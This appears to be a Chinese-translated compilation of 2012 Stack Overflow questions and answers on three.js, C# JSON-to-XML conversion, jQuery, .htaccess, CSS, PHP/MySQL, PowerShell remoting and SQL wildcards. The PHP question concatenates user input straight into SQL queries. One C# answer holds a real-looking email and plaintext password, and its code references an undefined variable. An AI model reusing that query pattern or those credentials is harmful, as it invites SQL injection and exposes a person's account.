我这里有个小问题。我有一个`THREE.Line`对象，具有材质和几何形状。init 方法将 2 个顶点推送到几何体，将 Line 添加到场景中，线条渲染得很好。

但是我有一个事件监听器......画布中的每次点击都会添加另一个顶点。但是在渲染场景时，只渲染了原来的 2 个顶点。我已经输出了一个转储，`scene.children`并且我确定 Line 在场景中，并且几何形状已经改变。

在文档中，它说了一些关于应用的内容：

```
geometry.dynamic = true
geometry.verticesNeedUpdate = true 
```

但这些也没有用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T15:37:36.140

查看three.js Wiki：[https ://github.com/mrdoob/three.js/wiki/Updates](https://github.com/mrdoob/three.js/wiki/Updates)

> 您只能更新缓冲区的内容，不能调整缓冲区的大小（这非常昂贵，基本上相当于创建新几何体）。
> 
> 您可以通过预先分配更大的缓冲区然后保持不需要的顶点折叠/隐藏来模拟调整大小。

几何图形是通过具有固定大小的顶点缓冲区对象指定的。您可以创建和删除缓冲区，但不能调整它们的大小。

作为一种解决方法，您可以创建一个带有额外顶点的几何图形，并将不需要的顶点折叠成一个点。

三.js r.52

* * *

编辑：在[用三个动态绘制一条线](https://stackoverflow.com/questions/31399856/drawing-a-line-with-three-js-dynamically/31411794#31411794)中描述了一种更新的方法。

# c# - 将 JSON 转换为 XML

> ID：13271369
> 
> 赞同：1
> 
> 时间：2012-11-07T14:05:00.623
> 
> 标签：c#, javascript, asp.net, json, xml-serialization

我知道这已经被问过很多次了。

但老实说，经过这么多尝试，解决方案对我不起作用。

因为我在**ASP.Net 1.1**中工作，所以无法处理这个 .net 级别。

所以我继续尝试了很多解决方案，即**使用 javascript 库、jquery 库**来做到这一点。

一些工具正在转换，但附加**<0>、<1> <2>**等等。在执行 LoadXml 时会引发格式错误。

我需要一个可以将 JSON 对象转换为 XML 的简单函数或好的库。

有的话请建议。

我试过这些，仅举几例：

[这给了我具有 <0>、<1>、<2> 类标签的 xml。](http://code.google.com/p/x2js/)

[这根本不起作用。](http://ruchirawageesha.blogspot.in/2011/06/xml-to-json-and-json-to-xml-conversion.html)

**编辑**

我删除了中间的 JSON 和 XML 数据，因为它很大：

JSON

```
"{\"CrashTestResult\":[[\"Crash Test Note\",\"Results based on a 35 MPH frontal crash and 38.5 MPH side crash.  Results are reported in a range of one to five stars, with five stars indicating the best crash protection for vehicles within \\"TIRES, P265/70R17 ALL-SEASON, BLACKWALL\",\"$0.00\"],[\"TIRES\",\"TIRES, P265/70R17 ON-/OFF-ROAD, WHITE OUTLINED-LETTER\",\"$125.00\"],[\"TIRES\",\"TIRES, P265/70R17 ON-/OFF-ROAD, BLACKWALL\",\"$150.00\"],[\"TIRES\",\"TIRES, P265/70R17 ALL-SEASON, WHITE OUTLINED-LETTER\",\"$125.00\"],[\"TIRES\",\"TIRES, P275/55R20 ALL-SEASON, BLACKWALL\",\"$0.00\"],[\"Drivetrain Years\",\"5\"],[\"Roadside Assistance Miles/km\",\"100,000\"],[\"Roadside Assistance Years\",\"5\"]],\"Wheel\":[\"WHEELS, 4 - 17\\\" X 7.5\\\" (43.2 CM X 19.1 CM) ALUMINUM, 5-SPOKE\",\"WHEELS, 4 - 17\\\" X 7.5\\\" (43.2 CM X 19.1 CM) ALUMINUM, 5-SPOKE\",\"WHEELS, 4 - 20\\\" X 8.5\\\" (50.8 CM X 21.6 CM) PAINTED ALUMINUM\"]}" 
```

想要 XML 之类的

```
"<?xml version=\"1.0\" encoding=\"utf-16\"?>\r\n<VINDescription xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\r\n  <CrashTestResult xmlns=\"http://autoexact.com/VINDecoder/\">\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Crash Test Note</string>\r\n      <string>Results based on a 35 MPH frontal crash and 38.5 MPH side crash.  Results are reported in a range of one to five stars, with five stars indicating the best crash protection for vehicles within the same weight class.  This test used driver and passenger belts and airbags.</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Frontal Driver</string>\r\n      <string>* * * *</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Frontal Passenger</string>\r\n      <string>* * * *</string>\r\n    </ArrayOfstring>\r\n<string>$2,755.00</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>CPOS PKG</string>\r\n      <string>28F CUSTOMER PREmas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Basic Miles/km</string>\r\n      <string>36,000</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Basic Years</string>\r\n      <string>3</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Corrosion Miles/km</string>\r\n      <string>100,000</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Corrosion Years</string>\r\n      <string>5</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Drivetrain Miles/km</string>\r\n      <string>36,000</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Drivetrain Note</string>\r\n      <string>Unlimited Years/Unlimited Miles for vehicles sold after 07/26/2007</string>\r\n    </ArrayOfstring>\r\n    <ArrayOfstring xmlns=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\">\r\n      <string>Drivetrain Years</string>\r\n      <string>3</string>\r\n    </ArrayOfstring>\r\n  </Warranty>\r\n  <Wheel xmlns=\"http://autoexact.com/VINDecoder/\" />\r\n</VINDescription>" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:21:52.293

嗨尝试这样的事情。这对我的应用程序非常有用，但没有在它们之外使用它，所以希望它有所帮助。

```
public string ParseJsonToXml(string sJsonObject)
    {
        DataContractJsonSerializer ser = new DataContractJsonSerializer(typeof(string));
        MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(sXMLJson));
        string sXMLDeSerialized = (string)ser.ReadObject(ms);
        ms.Close();
        return sXMLDeSerialized;
    } 
```

我按顺序将其解析为字符串，以便我可以将 xml 转换为数据集，反之亦然。

```
public DataSet ParseXmlToDataSet(string sXml)
    {      
        DataSet ds = new DataSet();
        StringReader sr = new StringReader(sXml);
        ds.ReadXml(sr);
        return ds;
    } 
```

获取数据集使用的 XML

```
//ds is typeof(DataSet)
ds.GetXml(); 
```

注意：这是我处理的数据的样子

```
<DATA>
<TLOGIN>
    <USER>thabo.pali@za.pwc.com</USER>
    <PASSWORD>"Monday@01</PASSWORD>
</TLOGIN>
</DATA> 
```

问候乔治

# xml - 与 XML Schema 结合使用的表示法名称

> ID：13271370
> 
> 赞同：6
> 
> 时间：2012-11-07T14:05:01.220
> 
> 标签：xml, xsd, xml-namespaces

我正在寻找**这种文字风格**的名称，在大括号中包含完整的命名空间 URI，后跟标识符名称。

```
{http://www.w3.org/2001/XMLSchema}dateTime 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-07T18:30:35.347

这是 James Clark 引入的一种符号，非常常用；例如，这就是 QName 在 JAXP API 规范中作为参数名称传递的方式。它不是标准化的，它可能最常被称为“克拉克符号”。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T14:15:56.347

有趣的问题，我以前从未见过这种形式的符号。快速搜索“花括号中的 xml 命名空间”的 Google 网站出现了这个网站：[http ://www.jclark.com/xml/xmlns.htm](http://www.jclark.com/xml/xmlns.htm)

看起来“通用名称”或“扩展数据模型”可能是您正在寻找的术语。链接文章的作者还建议不要使用 { } 表单，因为它与 XML 1.0 不兼容。

# jquery - jQuery如何限制减少的值

> ID：13271373
> 
> 赞同：0
> 
> 时间：2012-11-07T14:05:12.963
> 
> 标签：jquery, input, limit

我希望有人可以帮助我解决以下“问题”。

从 700 积分开始，客户可以购买出现在缩略图（.box）中的项目添加缩略图/项目需要 25 积分，因此当客户剩余的积分少于 25 时，应禁用添加按钮。（顺便说一句，这很有效）

但是在未来我想要更简单的动作来减少或增加不同数量的信用。我在示例中做了一个示例“动作”，因此当客户单击橙色方块时，它应该减少 15。这就是造成麻烦的原因。因为我不知道如何限制不同的递减值。

例如：如果还剩 24 个积分，客户不能再买一个盒子，但应该可以用 15 个积分买东西。（而且学分永远不应该低于零）

谁能帮我完成这个？请记住，我还想在未来通过更多行动来增加和减少。先感谢您。

[**JSFIDDLE**](http://jsfiddle.net/9HbWh/)

**代码** *JS*

```
var counter = 0;

$("#money").val(250);

$('#purchase').click(function() {
    var box = $('<div class="box"' + (counter) + '><div class="yellow"' + (counter) + '><div class="buy"' + (counter) + '></div></div></div>').appendTo('.container');
    $("#money").val(Number($("#money").val()) - 26);

    if ($("#money").val() < 25) {
        $('#purchase').prop("disabled", true);
    }

    $('.buy').click(function() {
        $(this).fadeOut();
     if ($("#money").val() < 25) {
        $('#purchase').prop("disabled", true);

        $("#money").val(Number($("#money").val()) - 15);
}
    });

}); 
```

*HTML*

```
<button id="purchase">Add a box </button>
<input id="money"></input>
<div class="container"></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:30:18.093

看看这个：http: [//jsfiddle.net/RbnBs/1/](http://jsfiddle.net/RbnBs/1/)

```
var counter = 0;

$("#money").val(250);

$('#purchase').click(function() {
    if($("#money").val() < 25)
        return; // or alert('not enough money');

    var box = $('<div class="box"' + (counter) + '><div class="yellow"' + (counter) + '><div class="buy"' + (counter) + '></div></div></div>').appendTo('.container');
    $("#money").val(Number($("#money").val()) - 25).triggerHandler('change');
});

$('#money').change(function(){
    $('#purchase').prop("disabled", $(this).val() < 25);
});

$('.container').on('click', '.buy', function() {
    if($("#money").val() < 15)
        return; // or alert('not enough money');
    $(this).fadeOut();
    $("#money").val(Number($("#money").val()) - 15).triggerHandler('change');;
}); 
```

# iphone - 带有动画的 UIButton 图像按钮

> ID：13271374
> 
> 赞同：3
> 
> 时间：2012-11-07T14:05:16.697
> 
> 标签：iphone, objective-c, ios

我有一个白色的图像按钮。当我点击时，它应该通过从下到上的动画变成黄色按钮图像，如果我再次点击黄色按钮图像，它必须从上到下动画并变成白色图像按钮图像。

这是我尝试过的：

```
 float originalY = btn.frame.origin.y; 
    float originalH = btn.bounds.size.height;

    [UIView animateWithDuration:3.0f delay:1.0f     options:UIViewAnimationOptionTransitionFlipFromBottom animations:^{

    btn.frame = CGRectMake(btn.frame.origin.x, (originalY + originalH), btn.bounds.size.width, 0);

    [btn setBackgroundImage:[UIImage imageNamed:@"yellowimg.png"] forState:UIControlStateNormal];

    [btn setTitleColor:[[UIColor alloc]initWithRed:38.0/255.0 green:38.0/255.0 blue:38.0/255.0 alpha:1.0] forState:UIControlStateNormal];

    }    
    completion:^(BOOL finished) {
        }]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:26:36.917

```
btn.frame = CGRectMake(btn.frame.origin.x, (originalY + originalH), btn.bounds.size.width, 0); 
```

此方法将使您的按钮带有`height = 0`. 如果你想卷曲（翻转）你的按钮并拥有从第一个出现的“新”按钮，我知道你应该使用类似的东西

```
[UIView beginAnimations:nil context:NULL];
[UIView setAnimationDuration:0.5];
[UIView setAnimationCurve:UIViewAnimationCurveEaseInOut];
[UIView setAnimationTransition:UIViewAnimationTransitionFlipFromRight forView:firstView cache:YES];
[firstView addSubview:secondView];
[UIView commitAnimations]; 
```

# .htaccess - Htaccess 规则。从 android 版本重定向到 pc 版本

> ID：13271375
> 
> 赞同：1
> 
> 时间：2012-11-07T14:05:16.443
> 
> 标签：.htaccess, mod-rewrite

我正在尝试使用以下规则从 android 版本重定向到 pc 版本：

```
http://example.com/android/categories

     RewriteCond %{HTTP_USER_AGENT} !^Android [NC]
RewriteCond %{REQUEST_URI} !^categories$ [NC]
RewriteRule categories$ /categories [L,R,QSA] 
```

问题是android版本进入了重写条件，即使我告诉它不要去如果用户代理是iphone和android ..

为什么android版本会读取该规则？

在这个例子中：

```
 RewriteCond %{HTTP_USER_AGENT} "!(android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos)" [NC]
RewriteRule hot$ /hot-apps  [L,R,QSA]
RewriteRule android/news$ /news  [L,R,QSA] 
```

第一个重写规则有效..而下一个不..

我也这样做了：

```
RewriteCond %{HTTP_USER_AGENT} "!(android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos)" [NC]
RewriteRule iphone/contact$ /contact [L,R,QSA] 
```

这也不起作用：

```
 RewriteCond %{HTTP_USER_AGENT} "!(android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos)" [NC]
RewriteCond %{REQUEST_URI} !^/android/ [NC]
RewriteRule news$ /news  [L,R,QSA] 
```

但还是不能正常工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T17:37:15.640

如果所有 Android / iPhone / 移动 URL 都有直接的 PC 等效项，例如

```
http://example.com/android/categories   <->   http://example.com/categories
http://example.com/android/news         <->   http://example.com/news
http://example.com/iphone/contact       <->   http://example.com/contact 
```

然后，您可以按照以下几行使用单个规则：

```
 RewriteBase /
 RewriteCond %{HTTP_USER_AGENT}     !(droid|blackberry|ipad|iphone|ipod|mobile|palmos|webos)  [NC]
 RewriteCond %{REQUEST_URI}         ^/(android|iphone)/ [NC]
 RewriteRule ^(android|iphone)/(.*)  /$1 [L,R] 
```

# css - 尝试在 div 标签中的 href 上实现 CSS

> ID：13271377
> 
> 赞同：1
> 
> 时间：2012-11-07T14:05:27.397
> 
> 标签：css

我有这个代码：

```
<div id="NAHC-topText">
<h2><a href="index.html">Link To Somewhere</a></h2>
</div> 
```

我想让 CSS 删除下划线并在用户滚动链接时更改悬停颜色。该链接加载简单的 html。我认为无法在 div 标签中成功实现这一点。

有什么线索吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:07:56.440

所以只需在 CSS 中设置适当的值。

```
a {
  text-decoration: none;
}

a:hover {
  color: red;
} 
```

根据您的实际需要，您可能希望将选择器更改为，`#NAHC-topText a`而不仅仅是`a`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:21:50.907

除了 Sirko 的回答，如果你只想影响

```
<a> 
```

在你的

```
<div id="NAHC-topText"> <h2> 
```

您的样式表应如下所示，以排除任何其他锚点和标题。

```
#NAHC-topText h2 a {text-decoration:none;}
#NAHC-topText h2 a:hover {color:red;} 
```

但是，Sirko 的回答当然没有错，只是它会影响特定文档中的所有 Your Anchors。

此外，如果您希望仅在悬停时显示下划线，您只需定义

```
a {text-decoration:none;}
a:hover {text-decoration:underline;color:red;} 
```

使用您选择的特定选择器

既然我再次提出了您的问题，反之亦然，当您希望它首先加下划线时，反之亦然，并且在没有下划线的情况下悬停时，您只需交换每种情况的条件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T14:28:32.607

```
<style>
  #NAHC-topText a{text-decoration:none;}
  #NAHC-topText a:hover{color:red;}
</style> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-02T19:36:01.310

```
#NAHC-topText a:hover{
   color: red;
   text-decoration:none;
} 
```

# jquery - 如何处理 jQuery ajax URL 更改？

> ID：13271381
> 
> 赞同：1
> 
> 时间：2012-11-07T14:05:31.463
> 
> 标签：jquery, ajax

我有一个网络服务：

> **/localhost/portal/WebServices/InformationNoticeUtility.asmx/InformationNoticesGet** *_*

例如，当用户转到另一个页面时：

> **/localhost/portal/报告/**

并尝试使用 jquery Ajax 调用此 Web 服务，它将失败，因为 jquery 将 Web 服务的 url 替换为以下 url：

> **/localhost/portal/Reporting/WebServices/InformationNoticeUtility.asmx/InformationNoticesGet** *_*

有什么办法可以传入一个对象来克服这个错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:21:55.147

查看您的代码会有所帮助，但是您的页面上有`<base>`标签吗？如果是这样，那可能会导致您意想不到的结果。如果没有，您可能实际上想要这种行为并且可能想尝试一下。

[有关警告的详细讨论，请参见此处](https://stackoverflow.com/questions/1889076/is-it-recommended-to-use-the-base-html-tag)。

# c# - 出现拒绝访问错误时停止响应写入文件

> ID：13271385
> 
> 赞同：0
> 
> 时间：2012-11-07T14:05:39.330
> 
> 标签：c#, asp.net

我有以下代码

```
try
{        
    GetFileAndDisplay() // Gets the file from the server and writes the file in a Response stream
}
catch (UnauthorizedAccessException ex)
{
    Page.ClientScript.RegisterStartupScript(this.GetType(), "Msg", "<script type='text/javascript'>alert('Error')</script>");
    Response.Clear();                
    Response.ContentType = "";               
    Response.End();                
} 
```

该文件仍会为客户端下载，尽管文件已损坏，但有办法阻止文件下载。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:09:40.850

```
try
{        
    GetFileAndDisplay() // Gets the file from the server and writes the file in a Response stream
}
catch (UnauthorizedAccessException ex)
{
    Page.ClientScript.RegisterStartupScript(this.GetType(), "Msg", "<script type='text/javascript'>alert('Error')</script>");
    Response.Clear();                
    Response.Redirect("path/to/some/page/that/tells/the/user/something/is/wrong")
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:25:02.360

当您捕获 UnauthorizedAccessException 时，为什么不抛出带有相关 HTTP 状态代码（即 401）的 HttpException -

```
throw new HttpException(401, ex.Message); 
```

# ios - 如何检索所有 NSNotificationCenter 观察者？

> ID：13271388
> 
> 赞同：13
> 
> 时间：2012-11-07T14:05:51.107
> 
> 标签：ios, cocoa-touch, cocoa, nsnotificationcenter

我想检索给定通知名称的观察者列表（对象和选择器）。我知道没有官方的 API。我也知道我可以[继承 NSNotificationCenter](https://stackoverflow.com/q/10346700/235297)来实现这一点。然而，有时这不是一个可行的选择，因为 NSNotificationCenter 的使用遍布代码甚至二进制框架。

所以我正在寻找一种非官方/私人的方式来做到这一点。（因为它只是关于调试，那很好。）

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2015-11-25T09:22:15.917

最后，Apple 添加了一种打印所有通知中心观察者的方法：

```
po [NSNotificationCenter defaultCenter] 
```

它打印一个逗号分隔的列表，其中包含名称、对象、观察者和选项：

```
<NSNotificationCenter:0x7f997b307500>
Name, Object, Observer, Options
WebPreferencesRemovedNotification, 0x11165b680, 0x116c87ff8, 1400
UIApplicationWillEnterForegroundNotification, 0x11165b680, 0x7f997a838000, 1400
... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:16:00.327

如果您不想子类化`NSNotificationCenter`，您可以重命名原始`addObserver:selector:name:object`方法并使用该名称创建自己的方法，并将其中的观察者添加到某个数组中，然后调用原始重命名方法。

看看以下方法：`class_addMethod`, `class_replaceMethod`, `class_getMethodImplementation`.

还要看看这个 SO 问题：[Method Swizzling](https://stackoverflow.com/questions/3267506/how-to-swizzle-a-class-method-on-ios)

我不确定你为什么想要观察者，但你可能会发现这个类很有用，它会自动为你删除观察者，我认为这可能是你想要的。[SFO观察者](https://github.com/krzysztofzablocki/SFObservers)

# php - 选择后 MySQL 值返回 Null

> ID：13271389
> 
> 赞同：0
> 
> 时间：2012-11-07T14:05:53.337
> 
> 标签：php, mysql, forms, select

```
if (! empty ( $fname ) && ! empty ( $lname )) {
        $query5 = "select * from " . $db_prefix . "customer_det where (fname = '" . $fname . "' and lname = '" . $lname . "')";
            $result5 = $mysqli->query ( $query5, MYSQLI_STORE_RESULT ) or die ( mysql_error () );
    } else {
        $query5 = "select * from " . $db_prefix . "customer_det where phone = '" . $phone . "'";
        $result5 = $mysqli->query ( $query5, MYSQLI_STORE_RESULT ) or die ( mysql_error () );

    }
    while ($row=$result5->fetch_assoc) {
        $uid = $row['id'];
            $visits = $row['visits'];
        }
        var_dump($uid);
        var_dump($visits);
            var_dump($result5);
            var_dump($fname);
            var_dump($lname); 
```

我不确定我要去哪里错了。我在 phpMyAdmin SQL 查询框中运行这两个查询，它返回一个行集。然后，当我在 PHP 中运行它并 var_dump 变量时，$uid 返回 NULL 以及 $visits。这是 var 转储：

```
NULL NULL object(mysqli_result)#4 (5) { ["current_field"]=> int(0) ["field_count"]=> int(34) ["lengths"]=> NULL ["num_rows"]=> int(1) ["type"]=> int(0) } string(6) "Wesley" string(6) "Snipes" 
```

任何建议都会很棒。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:12:01.050

当你打电话`fetch_assoc()`时，你忘记了括号：

```
while ($row=$result5->fetch_assoc) { 
```

应该：

```
while ($row=$result5->fetch_assoc()) { 
```

因此，循环永远不会进入，`$uid`也`$visits`不会被设置（所以它们仍然是`null`）。

# java - 在 Mountain Lion 上安装不同的 Java JDK 版本

> ID：13271390
> 
> 赞同：1
> 
> 时间：2012-11-07T14:05:55.183
> 
> 标签：java, java-6

我正在运行最新版本的 Mountain Lion，并且我想安装特定的 Java JDK 版本 (1.6.0_21)。我在这里搜索并用谷歌搜索，但我似乎找不到：

*   在哪里下载特定 Mac 版本的 Java，除了 Apple 提供的版本
*   如何安装 Mountain Lion 的“自动”下载器获得的不同的下载器

有没有办法做到这一点，或者我正在寻找不可能的事情？

我想要它的原因是与我当地大学安装的版本保持一致。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T12:48:34.920

只需从 Oracle 获取安装程序。

# security - 错误 Unknown security using Remote PSSession CredSSP

> ID：13271394
> 
> 赞同：1
> 
> 时间：2012-11-07T14:06:31.000
> 
> 标签：security, powershell, powershell-2.0, powershell-remoting

我在客户端启用了 Windows 7 64 位、Powershell 2.0 和 CredSSP

```
Enable-WSManCredSSP -Role Client -DelegateComputer * -Force 
```

我打开 Powershell 控制台，并执行 Enter-PSSession 命令以使用 CredSSP 身份验证连接 Windows 2008 Server：

```
Enter-PSSession -Computername ServerMOSS -Authentication Credssp -Credential MyDomain\installerUser 
```

我想远程执行 Get-WSManCredSSP 命令，但我收到错误：“...使用协商身份验证时：发生未知安全错误。”

```
PS C:\Users\myUser> Enter-PSSession -Computername ServerMOSS -Authentication Credssp -Credential MyDomain\installerUser

[ServerMOSS]: PS C:\Users\installerUser\Documents> Get-WSManCredSSP

WinRM cannot process the request. The following error occured while using Negotiate authentication: An unknown security
 error occurred.
 Possible causes are:
  -The user name or password specified are invalid.
  -Kerberos is used when no authentication method and no user name are specified.
  -Kerberos accepts domain user names, but not local user names.
  -The Service Principal Name (SPN) for the remote computer name and port does not exist.
  -The client and remote computers are in different domains and there is no trust between the two domains.
 After checking for the above issues, try the following:
  -Check the Event Viewer for events related to authentication.
  -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or us
e HTTPS transport.
 Note that computers in the TrustedHosts list might not be authenticated.
   -For more information about WinRM configuration, run the following command: winrm help config.
    + CategoryInfo          :
    + FullyQualifiedErrorId : WsManError,Microsoft.WSMan.Management.GetWSManCredSSPCommand

[ServerMOSS]: PS C:\Users\installerUser\Documents> Exit-PSSession 
```

IT部门在ServerMOSS中执行这个命令：

```
PS C:\Users\installerUser\Documents> enabled-psremoting -force 
```

他们得到错误：

```
WinRM already is set upt to receive requests on this machine
Set-WSManQuickConfig: WinRM cannot process the request. The following error occured while using Negotiate authentication: An unknown security error ocurred. 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T16:05:18.740

我有相同的问题。我已经搜索并发现多次检查/设置 SPN 可以解决问题：

所以试试这个：查看（只读）

```
setspn.exe -L MACHINENAME 
```

查看 HTTP/HTTPS 条目的结果（或任何重复项）

添加缺少的名称：

```
setspn -A HTTP/machinename
setspn -A HTTP/machinename.fqdn.com
setspn -A HTTPS/machinename
setspn -A HTTPS/machinename.fqdn.com 
```

来源：[WinRM QuickConfig 失败并显示 0x8033809D](http://blog.chrislehr.com/2012/06/winrm-quickconfig-failing-with.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-05T11:57:54.343

这是由于 HTTPS/HTTP 条目未向 SPN 注册。只需以管理员身份执行以下打开 Powershell ：

*使用以下命令检查 SPN 条目：*

PS C:\> setspn -L 域名\服务器名

*然后添加 HTTP/HTTPS 输入：*

1.  PS C:\> setspn -A HTTP/servername servername
2.  PS C:\> setspn -A HTTP/servername.fqdn.com 服务器名
3.  PS C:\> setspn -A HTTPS/服务器名 服务器名
4.  PS C:\> setspn -A HTTPS/servername.fqdn.com 服务器名

那么最后你可以在 PowerShell 提示符下使用**Enable-PSRemoting -Force**

# sql - 在 SQL 查询中允许 *

> ID：13271400
> 
> 赞同：2
> 
> 时间：2012-11-07T14:06:40.077
> 
> 标签：sql, sql-server, tsql

我有一个存储过程，我想在其中允许 * 以便如果用户：

*   类型 t* 然后更高，茶返回
*   类型 * 或*.* 然后返回所有结果
*   类型 t 然后返回所有具有 t 的结果，如 ptv、tall、sit

我的存储过程是这样的：

```
ALTER PROCEDURE [dbo].[SearchEntityDataNew]
    @SearchText varchar(100) = '*'

AS
BEGIN
    SELECT 'Entity' as pagetype,EntityID,EntityData,EntityDataID 
    FROM EntityData 
    WHERE  EntityData LIKE '%' + @SearchText+ '%'
    OR @SearchText = '*'

    union all

    SELECT 'Property' as pagetype,PropertyID,PropertyValue,EntityDataID  
    FROM EntityDataProperty 
    WHERE  PropertyValue LIKE '%' + @SearchText+ '%'
    OR @SearchText = '*'
END 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:21:02.387

你不能使用：

```
WHERE  PropertyValue LIKE REPLACE(@SearchText, '*', '%'); 
```

以下测试：

```
-- SAMPLE TABLE
DECLARE @T TABLE (A VARCHAR(100));
INSERT @T VALUES ('tea'), ('test'), ('foo'), ('bar'), ('foobar');

-- TEST USING WILDCARD AT END
DECLARE @SearchText VARCHAR(100) = 't*';
SELECT  *
FROM    @T
WHERE   A LIKE REPLACE(@SearchText, '*', '%');

-- TEST USING ONLY WILD CARD
SET @SearchText = '*';
SELECT  *
FROM    @T
WHERE   A LIKE REPLACE(@SearchText, '*', '%');

--TEST USING WILD CARD AT START
SET @SearchText = '*bar';
SELECT  *
FROM    @T
WHERE   A LIKE REPLACE(@SearchText, '*', '%');

--TEST USING WILD CARD AT START AND END
SET @SearchText = '*a*';
SELECT  *
FROM    @T
WHERE   A LIKE REPLACE(@SearchText, '*', '%'); 
```

输出：

```
-- Wild card at end: "t*"
tea
test

-- Wild card only: "*"
tea
test
foo
bar
foobar

-- Wild card at start: "*bar"
bar
foobar

-- wild card at start and end: "*a*"
tea
bar
foobar 
```

**编辑**

我刚刚重新阅读了您的问题，并看到了当没有通配符存在时在开头和结尾都假定通配符的要求，在这种情况下，您可以将其添加到程序的开头：

```
IF CHARINDEX('*', @SearchText) = 0
    SET @SearchText = '%' + @SearchText + '%'
ELSE
    SET @SearchText = REPLACE(@SearchText, '*', '%') 
```

然后只需使用

```
WHERE  PropertyValue LIKE @SearchText 
```

# c# - 如何在一个解决方案中访问其他项目

> ID：13271403
> 
> 赞同：-1
> 
> 时间：2012-11-07T14:06:54.200
> 
> 标签：c#, asp.net-mvc-3, projects-and-solutions

我有一个带有 3 个项目 Store.Domain、Store.UnitTests、Store.WebUI 的空解决方案商店

在域中，我有我的数据模型，我喜欢通过 Store.WebUI 访问。我尝试使用 Store.Domain 但是我得到一个错误类型或名称空间找不到你是否缺少使用指令或程序集引用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:10:42.160

右键单击 Store.WebUI 的引用部分，然后单击“添加引用”；选择项目'Store.Domain'，你应该很好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:10:26.197

您需要从 Store.WebUI 项目中引用 Store.Domain 项目。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:11:01.707

在 Visual Studio 中，您可以右键单击您的解决方案，然后选择添加现有项目。如果您想包含完整的项目。

或者您可以转到引用并将引用添加到您的 Store.Domain

然后你应该能够访问你的其他命名空间。

# mustache - 客户端模板的优点是什么（类似小胡子）

> ID：13271423
> 
> 赞同：2
> 
> 时间：2012-11-07T14:08:02.850
> 
> 标签：mustache, templating, client-side-templating

为了避免编写为动态页面手动生成 HTML 的 JavaScript 代码（不仅丑陋，而且根本不 DRY），并且考虑到简单和优雅（相对于性能），使用基于字符串的优点是什么客户端上的模板，例如 Mustache.js 或 Handlebars.js，分别检索 json 数据和模板，而不是使用检索服务器端呈现的 html 片段的 REST API？

我的印象是客户端模板是在动态页面上保持简单的最佳方法，但是在使用它之后我发现维护这样的页面有点复杂，它的主要优点是更好的性能和带宽使用，这通常不是我的主要目标。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:48:28.627

我目前正在使用 Twitter 的 Hogan 库，在此之前我使用的是 Trimpath 库。我是客户端模板的忠实信徒；但它们不应该被滥用。这里有几个论点：

1.  就像服务器端模板一样，它有助于区分应用程序逻辑和表示。与其在运行时手动创建 DOM 元素的层次结构，不如使用 HTML 定义模板并使用来自 javascript 的数据呈现它，从而创建更易读和更优雅的代码。

2.  我发现使用客户端模板来重复层次结构（例如 Twitter 帖子、博客条目、新闻文章等）是很实用的……服务器只发送 JSON 数据（大部分时间通过 AJAX 调用），并且数据可以立即绑定到模板。

